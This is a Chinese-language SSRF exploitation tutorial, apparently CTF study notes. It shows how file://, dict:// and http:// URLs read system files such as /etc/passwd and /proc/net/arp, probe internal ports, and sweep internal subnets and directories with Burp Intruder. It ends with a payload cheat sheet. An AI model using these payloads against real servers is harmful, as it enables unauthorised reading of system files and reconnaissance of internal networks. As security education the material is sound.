## 一句话概括

同一个 SSRF 入口，换不同的协议前缀就能干不同的事：**`file://` 读本机文件、`dict://` 探端口指纹、`http://` 扫目录和 Web 服务**。而 `file:///proc/net/*` 这几条特殊路径，能让服务器把**它自己的网络拓扑**吐给你。

## 原理

### 1. SSRF 的成因：一个"取数据"的功能点没管住目标地址

> 大部分 SSRF 的原因是：服务端提供了**从其他服务器应用获取数据**的功能，且没有对目标地址做过滤与限制。

拆开就是两件事：

| 条件 | 说明 |
|---|---|
| 服务端提供「取数据」功能 | 图片代理、URL 预览、数据抓取、Webhook …… 请求由服务器发出 |
| 没对目标地址做过滤与限制 | 协议不限、IP 不限、跳转不限 |

**攻击目标就变成了：从外网无法访问的内部系统。** 外网进不去的内网服务、只监听回环的管理端口、本机文件，全部经由服务器这个"内应"被摸到。

### 2. 为什么不同协议要分工

理论上一个协议能做很多事，但每种协议的设计目的不同，**返回信息的形态完全不同**：

| 协议 | 专长 | 为什么适合 |
|---|---|---|
| `file://` | 读取本地文件 | 协议最简单，直接把文件内容返回，不需要协议握手 |
| `dict://` | 端口探测 | 只要端口开着，服务就会回一句 banner，不要求完整协议握手 |
| `http://` | Web 服务交互 | 完整的 HTTP 协议支持，适合目录扫描、状态码判断 |

同一个端口用三种协议去碰，回来的东西是这样的：

```bash
# file:// —— 直接返回文件内容
file:///etc/passwd
→ root:x:0:0:root:/root:/bin/bash...

# dict:// —— 返回服务 banner（协议指纹）
dict://127.0.0.1:22
→ SSH-2.0-OpenSSH_8.2

# http:// —— 返回状态码和内容
http://127.0.0.1:80/admin
→ HTTP/1.1 200 OK ... 或 404 Not Found
```

**`dict://` 的价值在于"无脑探测"**：HTTP 要求目标会说 HTTP，`file://` 根本不走网络；只有 `dict://` 是"连上就说一句话"的极简协议，最适合批量刷端口。

## 利用条件

1. 有 SSRF 入口且 `file://` / `dict://` 未被 `CURLOPT_PROTOCOLS` 禁用
2. 有回显（能看到文件内容 / banner / 状态码），否则只能用时间差或带外通道判断
3. 做网段扫描时，目标网段确实可达（同网段、无 ACL 拦截）

## file 协议：读文件 + 摸清本机网络

### 基础读文件

```text
file:///etc/passwd     # 用户列表，确认运行权限
file:///etc/hosts      # 本机 hosts，含主机名与内网 IP
file:///etc/hostname   # 主机名
```

### 用 /proc 读内核暴露的网络状态

Linux 的 `/proc` 是内核的"实时报表"，`file://` 能直接读。**这是 SSRF 里做内网侦察最省事的一招：**

```text
file:///proc/net/arp       # ARP 缓存表 —— 与本机通信过的邻居主机 IP + MAC
file:///proc/net/fib_trie  # 路由/网段信息 —— 本机 IP、子网范围
file:///proc/net/route     # 路由表
file:///proc/net/tcp       # 当前 TCP 连接
```

两者定位不同，别混用：

| 特性 | `/proc/net/fib_trie` | `/proc/net/arp` |
|---|---|---|
| 核心功能 | 内核的路由表数据结构 | 系统的 ARP 缓存表 |
| 信息焦点 | **本机**的 IP 地址、路由范围 | **局域网内其它主机**的 IP 和 MAC |
| 关键数据 | 本机 IP、子网路由 | 其它主机 IP、MAC、网络接口 |
| 网络层级 | 网络层（IP / 路由） | 数据链路层（MAC） |
| 用途 | 侦察**自身**网络配置，圈定整个网段 | 侦察**相邻**设备，给局域网画地图 |
| 类比 | 「我住哪个小区、几号楼？」 | 「我的左邻右舍都是谁？」 |

### /proc/net/arp 的局限 —— 必须先有通信

> 这个扫描**只能看到有尝试通信过的 IP**，还没建立过联系的主机不会出现在表里。

所以正确用法是**先让它通信、再读表**：

```text
1. url=http://内网网段.1/     ← 让服务器向该 IP 发一次请求
2. url=file:///proc/net/arp    ← 再读 ARP 缓存，就能看到它了
```

挨个"邀请"一遍，ARP 表就慢慢被填满了。

### 手工工作量太大 → 交给 Burp

逐条手打 `file:///proc/net/arp` + 逐个 IP 触发通信，效率太低。用 Burp 的 Intruder 批量化：

```text
1. 浏览器挂 Burp 代理，随便拦一个对 内网网段.1 的请求
2. 右键 → Send to Intruder
3. 清掉默认的 § 标记（Clear §）
4. 在 IP 最后一段手动加上变量：http://内网网段.§1§
5. Payloads → Payload type: Numbers
   From: 1   To: 254   Step: 1
6. Start attack
7. 代理模式改为 Direct connection（直连），避免请求又回到 Burp 自己
```

跑完一轮，按响应长度 / 状态码筛出活的 IP。

## dict 协议：端口探测与信息泄露

### 与 file 协议的本质区别

| 特性 | `file://` | `dict://` |
|---|---|---|
| 本质 | 本地文件系统访问 | **网络协议** |
| 目标 | 只能访问**本机**文件 | 可以访问**远程**服务 |
| 交互方式 | 直接的读取操作 | 与字典服务的交互（可读、可写、可执行命令） |
| 默认端口 | 无（不经过网络） | 2629 |
| 主要攻击场景 | LFI（本地文件包含） | SSRF、信息泄露 |
| 功能范围 | 相对单一（读文件） | 很广（读、写、枚举、DoS） |

**一句话区别**：`file://` 在原地读盘，`dict://` 要发网络包。

### 端口探测用法

```text
dict://127.0.0.1:22      # 有回显 SSH-2.0-... → 22 开放，且是 OpenSSH
dict://127.0.0.1:6379    # 有回显 → Redis 开放
dict://127.0.0.1:3306    # 有回显（乱码 banner）→ MySQL 开放
```

判据：**端口关着 → 连接被拒 / 超时；端口开着 → 一定回点东西**（哪怕是乱码或协议报错），这也是"不要求完整协议握手"的含义。

## http 协议：目录扫描

`http://` 是最"正规"的用法，也是信息搜集的主力：**用字典替代 1~n 的暴力枚举，去猜站点里的子页面。**

```text
# 已知目标站点
http://内网地址/

# 子页面形式：域名 + 名字 + 后缀
http://内网地址/<名字>.php

# 把变量插在文件名位置，导入字典
http://内网地址/§name§.php
```

操作要点：

1. 把 `url` 参数的值在文件名处标记为 Intruder 变量
2. Payload 类型选 **Simple list**，导入一份常见文件名/目录名字典（`admin`、`login`、`flag`、`backup`、`www.zip`、`.git/config` ……）
3. 开始攻击，**按响应长度和状态码判断是否有内容** —— 200 且长度明显不同于 404 页面的，就是命中的页面

> 注意：这里扫描的**不是**互联网上的站点，而是"以靶机为跳板能访问到的内网站点"。同样的字典，从外网访问不到 80 端口，经由 SSRF 就能扫。

> 此处原为「协议对比总结」的截图，要点：三种协议各有专长 —— file 读文件、dict 探端口、http 扫服务，实战中按目标类型选协议。

## Payload 速查

| 目的 | Payload |
|---|---|
| 读用户列表 | `file:///etc/passwd` |
| 读本机 hosts | `file:///etc/hosts` |
| 读 ARP 缓存找邻居 | `file:///proc/net/arp` |
| 读本机网段 | `file:///proc/net/fib_trie` |
| 读路由表 | `file:///proc/net/route` |
| 探本机端口 | `dict://127.0.0.1:<port>` |
| 读远程主机的 dict 服务 | `dict://<ip>:2629/` |
| 扫内网 Web 目录 | `http://内网地址/§name§.php` |
| 触发一次通信（喂 ARP 表） | `http://内网网段.<1-254>/` |

## 踩坑与备注

- **`file://` 看不到目录**：想"列目录"只能靠猜路径或换漏洞类型，别在这儿浪费时间。
- **`/proc/net/arp` 是"被动"的**：没通信过的邻居主机不会出现，必须先用 `http://` 去敲一遍再回来读表。
- **扫描内网时注意请求量**：254 个 IP 全刷一遍在 CTF 里没问题，真实环境容易触发告警。
- **`dict://` 打 Redis 不如 `gopher://` 好用**：`dict://` 只能发简单的单行命令，要构造带参数的复杂命令（如 `SET` 写文件）必须换 gopher，见 03。
- **原文里的 `172.250.250.x` 是题目环境的一次性内网段**，本文统一写成「内网网段」；实战时换成目标实际网段。
